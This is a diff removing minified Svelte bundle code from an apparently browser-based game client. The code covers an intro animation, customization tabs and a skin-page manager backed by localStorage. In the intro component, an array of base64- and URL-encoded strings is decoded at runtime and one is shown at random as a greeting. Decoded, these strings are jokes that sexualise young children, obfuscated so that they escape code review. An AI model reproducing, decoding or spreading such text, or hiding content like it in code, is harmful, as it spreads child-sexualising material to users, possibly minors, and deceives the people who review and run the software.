-                                }), P[0] ? (0, x.vu6)(n.Xt, u = P[1] ? 2 : 0, u) : P[1] ? (0, x.vu6)(n.Xt, u = 1, u) : (0, x.vu6)(n.Xt, u = -1, u), (0, x.vu6)(U, d = 0 <= u, d)), "lockLinesplit" in $ && (s.A.eWI.forEach(($, e) => {
-                                    V[e] = $.mouse.pause
-                                }), V[0] ? (0, x.vu6)(n.NC, h = V[1] ? 2 : 0, h) : V[1] ? (0, x.vu6)(n.NC, h = 1, h) : (0, x.vu6)(n.NC, h = -1, h), (0, x.vu6)(q, A = 0 <= h, A))
-                            }), s.A.on("GfXwco", $ => {
-                                c && (0, x.vu6)(n.ZK, l = $, l)
-                            }), s.A.on("RyKxvm", $ => {
-                                (0, x.vu6)(n.hZ, r = $, r), (0, x.vu6)(j, o = !!$, o)
-                            }), [Q, k, T, K, X, o, r, l, c, h, A, u, d, g, m, C, p, f, _, w, v, b, y, B, F, I, D, N, E, S, Y, z, R, M, L, G, j, H, U, q, W]
-                        }, function $(e) {
-                            let t, s = e[0] && e[1] && o(e);
-                            return {
-                                c() {
-                                    s && s.c(), t = (0, x.Iex)()
-                                },
-                                m($, e) {
-                                    s && s.m($, e), (0, x.Yry)($, t, e)
-                                },
-                                p($, e) {
-                                    $[0] && $[1] ? s ? (s.p($, e), 3 & e[0] && (0, x.c7F)(s, 1)) : ((s = o($)).c(), (0, x.c7F)(s, 1), s.m(t.parentNode, t)) : s && ((0, x.V44)(), (0, x.Tn8)(s, 1, 1, () => {
-                                        s = null
-                                    }), (0, x.GYV)())
-                                },
-                                i($) {
-                                    (0, x.c7F)(s)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(s)
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), s && s.d($)
-                                }
-                            }
-                        }, x.jXN, {}, null, [-1, -1])
-                    }
-                }
-                let y = b
-            },
-            58650($, e, t) {
-                t.d(e, {
-                    A: () => A
-                });
-                var x = t(83839),
-                    s = (t(60821), t(64127)),
-                    i = t(30847),
-                    n = t(15308),
-                    a = t(10103),
-                    o = t(41949),
-                    r = t(95669),
-                    l = t(28858);
-
-                function c($) {
-                    let e, t, s, i, n, o, l, c, h, A, u, d, g, m, C, p, f;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("div"), t = (0, x.ND4)("div"), s = (0, x.ND4)("div"), i = (0, x.ND4)("img"), o = (0, x.xem)(), l = (0, x.ND4)("div"), (c = (0, x.ND4)("b")).textContent = "luka", h = (0, x.Qq7)(": "), (A = (0, x.ND4)("span")).textContent = "" + $[2], (0, x.mq_)(i.src, n = a.A) || (0, x.CFu)(i, "src", n), (0, x.CFu)(i, "crossorigin", "anonymous"), (0, x.CFu)(i, "class", "image s-13o84a9"), (0, x.CFu)(i, "alt", "Icon"), (0, x.CFu)(c, "class", "name s-13o84a9"), (0, x.CFu)(A, "class", "text s-13o84a9"), (0, x.CFu)(l, "class", "message s-13o84a9"), (0, x.CFu)(s, "class", "image-wrapper s-13o84a9"), (0, x.CFu)(t, "class", "center s-13o84a9"), (0, x.CFu)(e, "class", "container s-13o84a9")
-                        },
-                        m(n, a) {
-                            (0, x.Yry)(n, e, a), (0, x.BCw)(e, t), (0, x.BCw)(t, s), (0, x.BCw)(s, i), (0, x.BCw)(s, o), (0, x.BCw)(s, l), (0, x.BCw)(l, c), (0, x.BCw)(l, h), (0, x.BCw)(l, A), C = !0, p || (f = (0, x.KTR)(e, "click", $[1]), p = !0)
-                        },
-                        p: x.lQ1,
-                        i($) {
-                            C || ($ && (0, x.Dti)(() => {
-                                C && (d && d.end(1), (u = (0, x.b7f)(t, r._J, {
-                                    y: 150,
-                                    duration: 1100
-                                })).start())
-                            }), $ && (0, x.Dti)(() => {
-                                C && (m && m.end(1), (g = (0, x.b7f)(e, r.Rv, {
-                                    duration: 700
-                                })).start())
-                            }), C = !0)
-                        },
-                        o($) {
-                            u && u.invalidate(), $ && (d = (0, x.CUz)(t, r._J, {
-                                y: -150,
-                                duration: 500
-                            })), g && g.invalidate(), $ && (m = (0, x.CUz)(e, r.Rv, {
-                                duration: 500
-                            })), C = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), $ && d && d.end(), $ && m && m.end(), p = !1, f()
-                        }
-                    }
-                }
-                class h extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, a) {
-                            let r, c, h;
-                            (0, x.j0C)(e, s.z, $ => a(4, r = $)), (0, x.j0C)(e, l.S, $ => a(5, c = $)), (0, x.j0C)(e, l.W, $ => a(0, h = $));
-                            let A;
-                            return (0, o.Rc)(() => {
-                                (0, x.vu6)(l.W, h = !0, h), A = (0, i.wg)(() => {
-                                    (0, x.vu6)(l.W, h = !1, h), A = (0, i.wg)(() => {
-                                        (0, x.vu6)(l.S, c = (0, x.vu6)(s.z, r = !0, r), c)
-                                    }, 600)
-                                }, 1200)
-                            }), e = (e = ["c2hlJ3MlMjB0aGUlMjBraWQlMjBpbiUyMG1l", "aWYlMjBzaGUncyUyMG5pbmUsJTIwc2hlJ3MlMjBtaW5lJTIwJUYwJTlGJTk4JTg4", "aWYlMjBoZXIlMjBhZ2UlMjBpcyUyMG9uJTIwdGhlJTIwY2xvY2suLi4lMjAlRjAlOUYlOTglOEY=", "aSdtJTIwbm90JTIwJTIyc3RvcCUyMHRvdWNoaW5nJTIwbWUlMjBlbG1vJTIyIQ==", "aSUyMGxpa2UlMjBraWRzJTIwJUYwJTlGJUE1JUI0", "dGhlIHlvdW5nZXIgdGhlIHNvdWwsIHRoZSB0aWdodGVyIHRoZSBob2xl", "aWYgc2hlJ3MgZWxldmVuLCBJIHNlbmQgaGVyIHRvIGhlYXZlbg=="].map($ => decodeURI(atob($))))[~~(Math.random() * e.length)], [h, () => {
-                                clearTimeout(A), (0, x.vu6)(l.W, h = !1, h), (0, x.vu6)(l.S, c = (0, x.vu6)(s.z, r = !0, r), c), (0, n.$s)(0, "Skipped intro animation")
-                            }, e]
-                        }, function $(e) {
-                            let t, s = e[0] && c(e);
-                            return {
-                                c() {
-                                    s && s.c(), t = (0, x.Iex)()
-                                },
-                                m($, e) {
-                                    s && s.m($, e), (0, x.Yry)($, t, e)
-                                },
-                                p($, [e]) {
-                                    $[0] ? s ? (s.p($, e), 1 & e && (0, x.c7F)(s, 1)) : ((s = c($)).c(), (0, x.c7F)(s, 1), s.m(t.parentNode, t)) : s && ((0, x.V44)(), (0, x.Tn8)(s, 1, 1, () => {
-                                        s = null
-                                    }), (0, x.GYV)())
-                                },
-                                i($) {
-                                    (0, x.c7F)(s)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(s)
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), s && s.d($)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let A = h
-            },
-            8167($, e, t) {
-                t.d(e, {
-                    A: () => n
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95669));
-                class i extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, null, function $(e) {
-                            let t, i, n, a;
-                            return {
-                                c() {
-                                    ((t = (0, x.ND4)("div")).innerHTML = "", x.CFu)(t, "class", "account-container container s-cxw380")
-                                },
-                                m($, e) {
-                                    (0, x.Yry)($, t, e), a = !0
-                                },
-                                p: x.lQ1,
-                                i($) {
-                                    a || ($ && (0, x.Dti)(() => {
-                                        a && (n && n.end(1), (i = (0, x.b7f)(t, s._J, {
-                                            x: 150,
-                                            duration: 500
-                                        })).start())
-                                    }), a = !0)
-                                },
-                                o($) {
-                                    i && i.invalidate(), $ && (n = (0, x.CUz)(t, s._J, {
-                                        x: 150,
-                                        duration: 500
-                                    })), a = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), $ && n && n.end()
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let n = i
-            },
-            49053($, e, t) {
-                t.d(e, {
-                    A: () => A
-                });
-                var x = t(83839),
-                    s = (t(60821), t(95669)),
-                    e = t(54603),
-                    i = t(60743),
-                    n = t(22808);
-
-                function a($) {
-                    let e, t, s, i, n;
-                    return {
-                        c() {
-                            (e = (0, x.ND4)("div")).textContent = "Skins", t = (0, x.xem)(), (s = (0, x.ND4)("div")).textContent = "Perks", (0, x.CFu)(e, "class", "tab"), (0, x.goL)(e, "active", 0 === $[0]), (0, x.CFu)(s, "class", "tab"), (0, x.goL)(s, "active", 1 === $[0])
-                        },
-                        m(a, o) {
-                            (0, x.Yry)(a, e, o), (0, x.Yry)(a, t, o), (0, x.Yry)(a, s, o), i || (n = [(0, x.KTR)(e, "click", $[1]), (0, x.KTR)(s, "click", $[2])], i = !0)
-                        },
-                        p($, t) {
-                            1 & t && (0, x.goL)(e, "active", 0 === $[0]), 1 & t && (0, x.goL)(s, "active", 1 === $[0])
-                        },
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(t), (0, x.YoD)(s)), (i = !1, x.oOW)(n)
-                        }
-                    }
-                }
-
-                function o($) {
-                    let e, t;
-                    return e = new i.A({}), {
-                        c() {
-                            (0, x.N0i)(e.$$.fragment)
-                        },
-                        m($, s) {
-                            (0, x.wSR)(e, $, s), t = !0
-                        },
-                        i($) {
-                            t || ((0, x.c7F)(e.$$.fragment, $), t = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(e.$$.fragment, $), t = !1
-                        },
-                        d($) {
-                            (0, x.Hbl)(e, $)
-                        }
-                    }
-                }
-
-                function r($) {
-                    let e, t;
-                    return e = new n.A({}), {
-                        c() {
-                            (0, x.N0i)(e.$$.fragment)
-                        },
-                        m($, s) {
-                            (0, x.wSR)(e, $, s), t = !0
-                        },
-                        i($) {
-                            t || ((0, x.c7F)(e.$$.fragment, $), t = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(e.$$.fragment, $), t = !1
-                        },
-                        d($) {
-                            (0, x.Hbl)(e, $)
-                        }
-                    }
-                }
-                let l = (0, e.T5)(0),
-                    c = $ => {
-                        l.set($)
-                    };
-                class h extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, s) {
-                            let i, n = x.lQ1;
-                            return (0, x.j0C)(e, l, $ => s(0, i = $)), e.$$.on_destroy.push(() => n()), [i, () => c(0), () => c(1)]
-                        }, function $(e) {
-                            let t, i, n = e[0],
-                                l, c, h, A, u, d, g = a(e),
-                                m = [r, o],
-                                C = [];
-
-                            function p($) {
-                                return 0 === $[0] ? 0 : 1
-                            }
-                            return h = C[c = p(e)] = m[c](e), {
-                                c() {
-                                    t = (0, x.ND4)("div"), i = (0, x.ND4)("div"), g.c(), l = (0, x.xem)(), h.c(), (0, x.CFu)(i, "class", "tabs"), (0, x.CFu)(t, "class", "customization container s-rp2x31"), (0, x.goL)(t, "skins", 0 === e[0]), (0, x.goL)(t, "perks", 1 === e[0])
-                                },
-                                m($, e) {
-                                    (0, x.Yry)($, t, e), (0, x.BCw)(t, i), g.m(i, null), (0, x.BCw)(t, l), C[c].m(t, null), d = !0
-                                },
-                                p($, [e]) {
-                                    1 & e && (0, x.jXN)(n, n = $[0]) ? (g.d(1), (g = a($)).c(), g.m(i, null)) : g.p($, e);
-                                    let s = c;
-                                    (c = p($)) !== s && ((0, x.V44)(), (0, x.Tn8)(C[s], 1, 1, () => {
-                                        C[s] = null
-                                    }), (0, x.GYV)(), (h = C[c]) || (h = C[c] = m[c]($)).c(), (0, x.c7F)(h, 1), h.m(t, null)), (!d || 1 & e) && (0, x.goL)(t, "skins", 0 === $[0]), (!d || 1 & e) && (0, x.goL)(t, "perks", 1 === $[0])
-                                },
-                                i($) {
-                                    d || ((0, x.c7F)(h), $ && (0, x.Dti)(() => {
-                                        d && (u && u.end(1), (A = (0, x.b7f)(t, s._J, {
-                                            x: 150,
-                                            duration: 500
-                                        })).start())
-                                    }), d = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(h), A && A.invalidate(), $ && (u = (0, x.CUz)(t, s._J, {
-                                        x: 150,
-                                        duration: 500
-                                    })), d = !1
-                                },
-                                d($) {
-                                    $ && (0, x.YoD)(t), g.d($), C[c].d(), $ && u && u.end()
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let A = h
-            },
-            60743($, e, t) {
-                t.d(e, {
-                    A: () => i
-                });
-                var x = t(83839);
-                t(60821);
-                class s extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, null, function $(e) {
-                            let t;
-                            return {
-                                c() {
-                                    (t = (0, x.ND4)("div")).textContent = "To be implemented."
-                                },
-                                m($, e) {
-                                    (0, x.Yry)($, t, e)
-                                },
-                                p: x.lQ1,
-                                i: x.lQ1,
-                                o: x.lQ1,
-                                d($) {
-                                    $ && (0, x.YoD)(t)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let i = s
-            },
-            22808($, e, t) {
-                t.d(e, {
-                    A: () => k
-                });
-                var x = t(83839),
-                    e = (t(60821), t(78465)),
-                    s = t.n(e),
-                    i = t(41949),
-                    n = t(54603),
-                    a = t(15481),
-                    o = t(19680),
-                    r = t(33656),
-                    l = t(15308),
-                    e = t(83529),
-                    c = t(78225),
-                    h = t(95195);
-
-                function A($, e, t) {
-                    return ($ = $.slice())[20] = e[t], $[22] = t, $
-                }
-
-                function u($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("i"), t = (0, x.Qq7)(" Add Skin"), (0, x.CFu)(e, "class", "button-icon fal fa-plus s-15tzznm")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.Yry)($, t, s)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(t))
-                        }
-                    }
-                }
-
-                function d($) {
-                    let e, t;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("i"), t = (0, x.Qq7)(" Remove Skin"), (0, x.CFu)(e, "class", "button-icon fal fa-times s-15tzznm")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.Yry)($, t, s)
-                        },
-                        p: x.lQ1,
-                        d($) {
-                            $ && ((0, x.YoD)(e), (0, x.YoD)(t))
-                        }
-                    }
-                }
-
-                function g($) {
-                    let e, t, s, i;
-                    return (e = new a.A({
-                        props: {
-                            style: "display:flex;align-items:center;justify-content:flex-start;",
-                            $$slots: {
-                                default: [u]
-                            },
-                            $$scope: {
-                                ctx: $
-                            }
-                        }
-                    })).$on("click", $[13]), (s = new a.A({
-                        props: {
-                            style: "display:flex;align-items:center;justify-content:flex-start;",
-                            $$slots: {
-                                default: [d]
-                            },
-                            $$scope: {
-                                ctx: $
-                            }
-                        }
-                    })).$on("click", $[14]), {
-                        c() {
-                            (0, x.N0i)(e.$$.fragment), t = (0, x.xem)(), (0, x.N0i)(s.$$.fragment)
-                        },
-                        m($, n) {
-                            (0, x.wSR)(e, $, n), (0, x.Yry)($, t, n), (0, x.wSR)(s, $, n), i = !0
-                        },
-                        p($, t) {
-                            var x = {},
-                                x = (8388608 & t && (x.$$scope = {
-                                    dirty: t,
-                                    ctx: $
-                                }), e.$set(x), {});
-                            8388608 & t && (x.$$scope = {
-                                dirty: t,
-                                ctx: $
-                            }), s.$set(x)
-                        },
-                        i($) {
-                            i || ((0, x.c7F)(e.$$.fragment, $), (0, x.c7F)(s.$$.fragment, $), i = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(e.$$.fragment, $), (0, x.Tn8)(s.$$.fragment, $), i = !1
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(t), (0, x.Hbl)(e, $), (0, x.Hbl)(s, $)
-                        }
-                    }
-                }
-
-                function m($) {
-                    let e, t, s = $[4] + 1 + "",
-                        i, n, a = v.length + "",
-                        o;
-                    return {
-                        c() {
-                            e = (0, x.ND4)("span"), t = (0, x.Qq7)("Page "), i = (0, x.Qq7)(s), n = (0, x.Qq7)(" of "), o = (0, x.Qq7)(a), (0, x.CFu)(e, "class", "count s-15tzznm")
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), (0, x.BCw)(e, i), (0, x.BCw)(e, n), (0, x.BCw)(e, o)
-                        },
-                        p($, e) {
-                            16 & e && s !== (s = $[4] + 1 + "") && (0, x.iQh)(i, s)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e)
-                        }
-                    }
-                }
-
-                function C($) {
-                    let e, t, s, i, n, a, o;
-
-                    function l() {
-                        return $[17]($[22])
-                    }
-                    return {
-                        c() {
-                            e = (0, x.ND4)("span"), t = (0, x.ND4)("img"), i = (0, x.xem)(), (0, x.CFu)(t, "class", "selected image s-15tzznm"), (0, x.mq_)(t.src, s = $[20] || r.nG) || (0, x.CFu)(t, "src", s), (0, x.goL)(t, "selected", $[4] === $[5] && $[22] === $[3]), (0, x.CFu)(e, "class", "skin s-15tzznm"), (0, x.CFu)(e, "data-index", n = $[22])
-                        },
-                        m($, s) {
-                            (0, x.Yry)($, e, s), (0, x.BCw)(e, t), (0, x.BCw)(e, i), a || (o = [(0, x.KTR)(t, "error", E), (0, x.KTR)(e, "click", l)], a = !0)
-                        },
-                        p(e, i) {
-                            $ = e, 16 & i && !(0, x.mq_)(t.src, s = $[20] || r.nG) && (0, x.CFu)(t, "src", s), 56 & i && (0, x.goL)(t, "selected", $[4] === $[5] && $[22] === $[3])
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (a = !1, x.oOW)(o)
-                        }
-                    }
-                }
-
-                function p($) {
-                    let e = $[2],
-                        t, s = C($);
-                    return {
-                        c() {
-                            s.c(), t = (0, x.Iex)()
-                        },
-                        m($, e) {
-                            s.m($, e), (0, x.Yry)($, t, e)
-                        },
-                        p($, i) {
-                            4 & i && (0, x.jXN)(e, e = $[2]) ? (s.d(1), (s = C($)).c(), s.m(t.parentNode, t)) : s.p($, i)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(t), s.d($)
-                        }
-                    }
-                }
-
-                function f($) {
-                    let e, t = (0, x.rv_)(v[$[4]]),
-                        s = [];
-                    for (let i = 0; i < t.length; i += 1) s[i] = p(A($, t, i));
-                    return {
-                        c() {
-                            for (let $ = 0; $ < s.length; $ += 1) s[$].c();
-                            e = (0, x.Iex)()
-                        },
-                        m($, t) {
-                            for (let i = 0; i < s.length; i += 1) s[i] && s[i].m($, t);
-                            (0, x.Yry)($, e, t)
-                        },
-                        p($, i) {
-                            if (1084 & i) {
-                                t = (0, x.rv_)(v[$[4]]);
-                                let n;
-                                for (n = 0; n < t.length; n += 1) {
-                                    var a = A($, t, n);
-                                    s[n] ? s[n].p(a, i) : (s[n] = p(a), s[n].c(), s[n].m(e.parentNode, e))
-                                }
-                                for (; n < s.length; n += 1) s[n].d(1);
-                                s.length = t.length
-                            }
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(e), (0, x.ppq)(s, $)
-                        }
-                    }
-                }
-
-                function _($) {
-                    let e = $[2],
-                        t, s = f($);
-                    return {
-                        c() {
-                            s.c(), t = (0, x.Iex)()
-                        },
-                        m($, e) {
-                            s.m($, e), (0, x.Yry)($, t, e)
-                        },
-                        p($, i) {
-                            4 & i && (0, x.jXN)(e, e = $[2]) ? (s.d(1), (s = f($)).c(), s.m(t.parentNode, t)) : s.p($, i)
-                        },
-                        d($) {
-                            $ && (0, x.YoD)(t), s.d($)
-                        }
-                    }
-                }
-                let w = [],
-                    v = [
-                        []
-                    ],
-                    b, y = () => {
-                        localStorage.setItem("skinPages", JSON.stringify(v))
-                    },
-                    B = () => {
-                        localStorage.setItem("skinData", JSON.stringify(b))
-                    };
-                (() => {
-                    if (!(() => {
-                            let $;
-                            if ("skinPages" in localStorage) {
-                                (0, l.$s)(0, "Loading skin pages from cache");
-                                try {
-                                    $ = JSON.parse(localStorage.getItem("skinPages"))
-                                } catch (e) {}
-                            }
-                            if (!Array.isArray($) || $.length < 1) {
-                                if ("skins" in localStorage) return !1;
-                                $ = [
-                                    []
-                                ]
-                            }
-                            if (1 === $.length) {
-                                var t = $[0];
-                                for (let x = t.length; x < 2; x++) t.push(r.nG)
-                            }
-                            return v = $, y(), !0
-                        })()) {
-                        (0, l.$s)(0, "Loading skin pages from skins cache");
-                        let $ = [];
-                        if ("skins" in localStorage) {
-                            try {
-                                $ = JSON.parse(localStorage.getItem("skins"))
-                            } catch (e) {
-                                return
-                            }
-                            if (!Array.isArray($)) return;
-                            for (let t = $.length; t < 2; t++) $.push(r.nG)
-                        }
-                        let x = 0,
-                            s = 0;
-                        for (var i = (w = $).length; s < i;) v[x++] = w.slice(s, s += 9);
-                        y()
-                    }
-                })(), (() => {
-                    if ("skinData" in localStorage) try {
-                        return b = JSON.parse(localStorage.getItem("skinData"))
-                    } catch ($) {}
-                    b = {
-                        skins: [0, 0],
-                        pages: [0, 0],
-                        selectedPages: [0, 0]
-                    }, B()
-                })();
-                let F = (0, n.T5)(c.A.yNT),
-                    I = (0, n.T5)(Math.min(b.pages[(0, n.Jt)(F)], v.length)),
-                    D = (0, n.T5)(b.skins[(0, n.Jt)(F)]),
-                    N = (0, n.T5)(b.selectedPages[(0, n.Jt)(F)]),
-                    E = (e.A.on("zrVIMz", ($, e) => {
-                        "activeTabContext" === $ && F.set(e)
-                    }), I.subscribe($ => {
-                        b.pages[(0, n.Jt)(F)] = $, B()
-                    }), D.subscribe($ => {
-                        b.skins[(0, n.Jt)(F)] = $, B()
-                    }), N.subscribe($ => {
-                        b.selectedPages[(0, n.Jt)(F)] = $, B()
-                    }), F.subscribe($ => {
-                        I.set(b.pages[$]), D.set(b.skins[$]), N.set(b.selectedPages[$])
-                    }), h.A.on("fzvxek", $ => {
-                        var e = v[(0, n.Jt)(I)];
-                        (0, n.Jt)(D) > e.length && D.set(0), e[(0, n.Jt)(D)] = $, y()
-                    }), async $ => {
-                        $.currentTarget.src = r.nG
-                    });
-                class Q extends x.r7T {
-                    constructor($) {
-                        super(), (0, x.TsN)(this, $, function $(e, t, n) {
-                            let a, o, l;
-                            (0, x.j0C)(e, D, $ => n(3, a = $)), (0, x.j0C)(e, I, $ => n(4, o = $)), (0, x.j0C)(e, N, $ => n(5, l = $));
-                            let c, A = !1,
-                                u = !1,
-                                d = $ => {
-                                    var e = v[o];
-                                    a > e.length && D.set(0), e[a] = $, n(2, u = !u), y()
-                                };
-                            (0, i.Rc)(() => {
-                                h.A.on("fzvxek", d)
-                            }), (0, i.sA)(() => {
-                                h.A.off("fzvxek", d)
-                            });
-                            let g = $ => {
-                                    (0, x.vu6)(D, a = $, a), (0, x.vu6)(N, l = o, l);
-                                    var e = v[o];
-                                    $ > e.length && ($ = 0), h.A.emit("fzvxek", e[$])
-                                },
-                                m;
-                            return [c, A, u, a, o, l, () => {
-                                (0, x.vu6)(I, o = 0, o)
-                            }, () => {
-                                (0, x.vu6)(I, o = v.length - 1, o)
-                            }, () => {
-                                (0, x.vu6)(I, o = Math.max(o - 1, 0), o)
-                            }, () => {
-                                (0, x.vu6)(I, o = Math.min(o + 1, v.length - 1), o)
-                            }, g, $ => {
-                                $.preventDefault(), m = -1;
-                                let e = $.target,
-                                    t = 3;
-                                for (; null != e && t--;) e.hasAttribute("data-index") && (m = +e.getAttribute("data-index")), e = e.parentElement;
-                                c && A && c.update(), n(1, A = !0)
-                            }, $ => {
-                                n(1, A = !1)
-                            }, () => {
-                                n(1, A = !1);
-                                let $ = v[v.length - 1];
-                                9 === $.length && v.push($ = []), $.push(r.nG), (0, x.vu6)(I, o = v.length - 1, o), y(), n(2, u = !u)
-                            }, async () => {
-                                    var $;
-                                    if (n(1, A = !1), -1 !== m) {
-                                        if ((await s().fire({
-                                                text: "Are you sure you would like to remove this skin?",
-                                                confirmButtonText: "Yes",
-                                                cancelButtonText: "No",
-                                                showCancelButton: !0
-                                            })).isConfirmed) {
-                                            let e = v[o];
-                                            1 === v.length && e.length <= 1 ? m = -1 : (e.length <= 1 ? (v.splice(o, 1), (0, x.vu6)(I, --o, o), e = v[o]) : v[o].splice(m, 1), a > ($ = e.length - 1) && (0, x.vu6)(D, a = $, a), y(), m = -1, n(2, u = !u))
-                                        } else m = -1
-                                    }
-                                },
-                                function($) {
-                                    n(1, A = $)
-                                },
-                                function($) {
-                                    x.Dnk[$ ? "unshift" : "push"](() => {
-                                        n(0, c = $)
-                                    })
-                                }, $ => g($)]
-                        }, function $(e) {
-                            let t, s, i, n, a, r, l, c, h, A = e[4],
-                                u, d, C, p, f, w, v, b, y = e[3],
-                                B, F, I;
-
-                            function D($) {
-                                e[15]($)
-                            }
-                            var N = {
-                                $$slots: {
-                                    default: [g]
-                                },
-                                $$scope: {
-                                    ctx: e
-                                }
-                            };
-                            void 0 !== e[1] && (N.show = e[1]), t = new o.A({
-                                props: N
-                            }), x.Dnk.push(() => (0, x.oIE)(t, "show", D)), e[16](t);
-                            let E = m(e),
-                                Q = _(e);
-                            return {
-                                c() {
-                                    (0, x.N0i)(t.$$.fragment), i = (0, x.xem)(), n = (0, x.ND4)("div"), a = (0, x.ND4)("div"), r = (0, x.ND4)("i"), l = (0, x.xem)(), c = (0, x.ND4)("i"), h = (0, x.xem)(), E.c(), u = (0, x.xem)(), d = (0, x.ND4)("i"), C = (0, x.xem)(), p = (0, x.ND4)("i"), f = (0, x.xem)(), w = (0, x.ND4)("i"), v = (0, x.xem)(), b = (0, x.ND4)("div"), Q.c(), (0, x.CFu)(r, "class", "selector fas fa-arrow-left s-15tzznm"), (0, x.CFu)(r, "data-tip", "Seek to the previous skin page"), (0, x.CFu)(c, "class", "selector fas fa-fast-backward s-15tzznm"), (0, x.CFu)(c, "data-tip", "Seek to the first skin page"), (0, x.CFu)(d, "class", "selector fas fa-plus s-15tzznm"), (0, x.CFu)(d, "data-tip", "Add a new skin"), (0, x.CFu)(p, "class", "selector fas fa-fast-forward s-15tzznm"), (0, x.CFu)(p, "data-tip", "Seek to the last skin page"), (0, x.CFu)(w, "class", "selector fas fa-arrow-right s-15tzznm"), (0, x.CFu)(w, "data-tip", "Seek to the next skin page"), (0, x.CFu)(a, "class", "selectors s-15tzznm"), (0, x.CFu)(b, "class", "skins s-15tzznm"), (0, x.CFu)(n, "class", "skin-container s-15tzznm")
-                                },
-                                m($, s) {
-                                    (0, x.wSR)(t, $, s), (0, x.Yry)($, i, s), (0, x.Yry)($, n, s), (0, x.BCw)(n, a), (0, x.BCw)(a, r), (0, x.BCw)(a, l), (0, x.BCw)(a, c), (0, x.BCw)(a, h), E.m(a, null), (0, x.BCw)(a, u), (0, x.BCw)(a, d), (0, x.BCw)(a, C), (0, x.BCw)(a, p), (0, x.BCw)(a, f), (0, x.BCw)(a, w), (0, x.BCw)(n, v), (0, x.BCw)(n, b), Q.m(b, null), B = !0, F || (I = [(0, x.KTR)(r, "click", e[8]), (0, x.KTR)(c, "click", e[6]), (0, x.KTR)(d, "click", e[13]), (0, x.KTR)(p, "click", e[7]), (0, x.KTR)(w, "click", e[9]), (0, x.KTR)(b, "contextmenu", e[11]), (0, x.KTR)(b, "click", e[12])], F = !0)
-                                },
-                                p($, [e]) {
-                                    var i = {};
-                                    8388608 & e && (i.$$scope = {
-                                        dirty: e,
-                                        ctx: $
-                                    }), !s && 2 & e && (s = !0, i.show = $[1], (0, x.Jk$)(() => s = !1)), t.$set(i), 16 & e && (0, x.jXN)(A, A = $[4]) ? (E.d(1), (E = m($)).c(), E.m(a, u)) : E.p($, e), 8 & e && (0, x.jXN)(y, y = $[3]) ? (Q.d(1), (Q = _($)).c(), Q.m(b, null)) : Q.p($, e)
-                                },
-                                i($) {
-                                    B || ((0, x.c7F)(t.$$.fragment, $), B = !0)
-                                },
-                                o($) {
-                                    (0, x.Tn8)(t.$$.fragment, $), B = !1
-                                },
-                                d($) {
-                                    $ && ((0, x.YoD)(i), (0, x.YoD)(n)), e[16](null), (0, x.Hbl)(t, $), E.d($), Q.d($), (F = !1, x.oOW)(I)
-                                }
-                            }
-                        }, x.jXN, {})
-                    }
-                }
-                let k = Q
-            },
-            87399($, e, t) {
-                t.d(e, {
-                    A: () => c
-                });
-                var x = t(83839),
-                    s = (t(60821), t(43228)),
-                    i = t(48481),
-                    n = t(49053),
-                    a = t(8167),
-                    o = t(64127);
-
-                function r() {
-                    let $, e, t, o, r, l, c, h, A, u, d;
-                    return o = new s.A({}), l = new i.A({}), h = new a.A({}), u = new n.A({}), {
-                        c() {
-                            $ = (0, x.ND4)("div"), e = (0, x.ND4)("div"), t = (0, x.xem)(), (0, x.N0i)(o.$$.fragment), r = (0, x.xem)(), (0, x.N0i)(l.$$.fragment), c = (0, x.xem)(), (0, x.N0i)(h.$$.fragment), A = (0, x.xem)(), (0, x.N0i)(u.$$.fragment), (0, x.CFu)(e, "class", "bar s-wwp2cq"), (0, x.CFu)($, "class", "main-container s-wwp2cq")
-                        },
-                        m(s, i) {
-                            (0, x.Yry)(s, $, i), (0, x.BCw)($, e), (0, x.BCw)($, t), (0, x.wSR)(o, $, null), (0, x.BCw)($, r), (0, x.wSR)(l, $, null), (0, x.BCw)($, c), (0, x.wSR)(h, $, null), (0, x.BCw)($, A), (0, x.wSR)(u, $, null), d = !0
-                        },
-                        i($) {
-                            d || ((0, x.c7F)(o.$$.fragment, $), (0, x.c7F)(l.$$.fragment, $), (0, x.c7F)(h.$$.fragment, $), (0, x.c7F)(u.$$.fragment, $), d = !0)
-                        },
-                        o($) {
-                            (0, x.Tn8)(o.$$.fragment, $), (0, x.Tn8)(l.$$.fragment, $), (0, x.Tn8)(h.$$.fragment, $), (0, x.Tn8)(u.$$.fragment, $), d = !1
-                        },
-                        d(e) {
-                            e && (0, x.YoD)($), (0, x.Hbl)(o), (0, x.Hbl)(l), (0, x.Hbl)(h), (0, x.Hbl)(u)
-                        }
-                    }
-                }
